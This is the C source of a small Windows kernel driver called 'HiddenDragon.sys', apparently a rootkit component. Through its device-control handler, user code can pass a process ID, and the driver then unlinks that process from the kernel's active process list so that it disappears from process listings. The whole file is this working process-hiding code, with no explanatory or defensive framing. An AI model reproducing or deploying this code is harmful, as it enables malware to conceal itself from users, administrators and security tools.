#include "ntapi.h"
#include "definitions.h"

PDEVICE_OBJECT pDeviceObject;
UNICODE_STRING rDevices, rDosDevices;

ULONG HideProcess(ULONG pid)
{
	BYTE* eprocess;
	ULONG status = HIDE_STATUS_FAILURE;
	if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &eprocess)))
	{
		KIRQL irql = KeRaiseIrqlToDpcLevel();
		PLIST_ENTRY procEntry, prevEntry, nextEntry;

		procEntry = ((LIST_ENTRY*)(eprocess + ACTIVE_PROCESS_LINKS_FLINK));
		prevEntry = procEntry->Blink;
		nextEntry = procEntry->Flink;

		nextEntry->Blink = prevEntry;
		prevEntry->Flink = nextEntry;
		procEntry->Flink = procEntry;
		procEntry->Blink = procEntry;

		KeLowerIrql(irql);
		status = HIDE_STATUS_SUCCESS;
	}
	return status;
}

NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriverObject)
{
	DbgPrintEx(0, 0, "HiddenDragon.sys Unloaded\n");
	IoDeleteSymbolicLink(&rDosDevices);
	IoDeleteDevice(pDriverObject->DeviceObject);
	return STATUS_SUCCESS;
}

NTSTATUS DriverDispatch(PDEVICE_OBJECT pDeviceObject, PIRP irp)
{
	NTSTATUS status;
	ULONG bytesio = 0;
	PIO_STACK_LOCATION pio;
	pio = IoGetCurrentIrpStackLocation(irp);

	switch (pio->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_PROCESS_HIDE:
		PULONG output = (PULONG)irp->AssociatedIrp.SystemBuffer;
		*output = HideProcess(*output);
		status = STATUS_SUCCESS;
		bytesio = sizeof(output);
		break;

	default:
		status = STATUS_INVALID_PARAMETER;
		bytesio = 0;
		break;
	}
	irp->IoStatus.Status = status;
	irp->IoStatus.Information = bytesio;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS CreateCall(PDEVICE_OBJECT pDeviceObject, PIRP irp)
{
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS CloseCall(PDEVICE_OBJECT pDeviceObject, PIRP irp)
{
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)
{
	DbgPrintEx(0, 0, "HiddenDragon.sys Loaded\n");
	RtlInitUnicodeString(&rDevices, L"\\Device\\HiddenDragon");
	RtlInitUnicodeString(&rDosDevices, L"\\DosDevices\\HiddenDragon");

	IoCreateDevice(pDriverObject, 0, &rDevices, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	IoCreateSymbolicLink(&rDosDevices, &rDevices);

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCall;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = CloseCall;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatch;
	pDriverObject->DriverUnload = UnloadDriver;

	pDeviceObject->Flags |= DO_DIRECT_IO;
	pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

	return STATUS_SUCCESS;
}
